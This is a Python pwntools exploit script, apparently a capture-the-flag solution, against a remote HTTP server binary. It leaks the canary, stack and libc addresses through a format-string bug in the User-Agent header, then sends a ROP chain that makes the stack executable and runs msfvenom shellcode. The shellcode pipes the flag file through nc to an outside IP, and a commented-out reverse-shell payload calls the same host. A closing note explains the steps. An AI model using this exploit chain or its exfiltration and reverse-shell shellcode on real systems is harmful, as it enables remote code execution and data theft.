#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import ELF, success
from pwn import context, fit, flat
from base64 import b64encode
import requests
import sys
import re
context.bits = 64

if sys.argv[1] == "l":
    URL = "http://localhost:1337" 
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
else:
    URL = "http://199.247.6.180:10000"
    libc = ELF("./libcd_x64", checksec = False)
elf = ELF("./server", checksec = False)

def leak(payload):
    headers = {"User-Agent": payload}
    params = {"toy": b64encode('fsb\0')}
    r = requests.get(URL, headers = headers, params = params)
    l = re.findall(r'''<br>\[GET\] / - (.*)</small></footer></body></html>''', r.text)[0].split('.')

    canary = int(l[0], 16)
    success("canary -> {:#x}".format(canary))
    stack = int(l[1], 16) >> 12 << 12
    success("stack -> {:#x}".format(stack))
    libc.address = int(l[2], 16) - libc.sym['__libc_start_main'] - 231
    success("libc -> {:#x}".format(libc.address))
    return canary, stack

def rop(ropchain):
    #  params = {"toy": b64encode(ropchain)}
    #  r = requests.get(url, params = params)
    url = '''{url}/?toy={payload}'''.format(url = URL, payload = b64encode(ropchain))
    r = requests.get(url, timeout = 3)

if __name__ == "__main__":
    canary, stack = leak("%7$p.%8$p.%37$p")

    prdi = libc.address + 0x000000000002155f# pop rdi; ret;
    prsi = libc.address + 0x0000000000023e6a# pop rsi; ret;
    prdx = libc.address + 0x0000000000001b96# pop rdx; ret;
    jrsp = libc.address + 0x0000000000002b1d# jmp rsp;

    # msfvenom -p linux/x64/shell/reverse_tcp LHOST=123.207.141.87 LPORT=12345 -f python -v sc
    #  sc =  ""
    #  sc += "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
    #  sc += "\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a"
    #  sc += "\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
    #  sc += "\x48\xb9\x02\x00\x30\x39\x7b\xcf\x8d\x57\x51\x48\x89"
    #  sc += "\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x5e\x5a\x0f"
    #  sc += "\x05\xff\xe6"

    #  msfvenom -p linux/x64/exec cmd="cat flag| nc 123.207.141.87 12345" -f python -v sc
    sc =  ""
    sc += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
    sc += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
    sc += "\x52\xe8\x22\x00\x00\x00\x63\x61\x74\x20\x66\x6c\x61"
    sc += "\x67\x7c\x20\x6e\x63\x20\x31\x32\x33\x2e\x32\x30\x37"
    sc += "\x2e\x31\x34\x31\x2e\x38\x37\x20\x31\x32\x33\x34\x35"
    sc += "\x00\x56\x57\x48\x89\xe6\x0f\x05"


    payload  = fit({
        0x48: flat(canary),
        0x58: flat(
                prdi, stack,
                prsi, 0x1000,
                prdx, 0x7,
                libc.sym['mprotect'],
                jrsp
                )
        }, filler = '\0')
    payload += sc

    #  raw_input("DEBUG: ")
    rop(payload)
    success("DONE")
'''
1. leak canary, stack address and libc.address using format string bug in router();
2. with known canary and libc.address, we're able to ROP.
3. I just want to send my payload using requests.get(), so I make a mprotect(stack, 0x1000, 7) and using rop then jump to my shellcode.
However, I've no idea why reverse_tcp shellcode failed. I guess it stucks in requests.get. Please kindly let me know if you know the answer.
'''
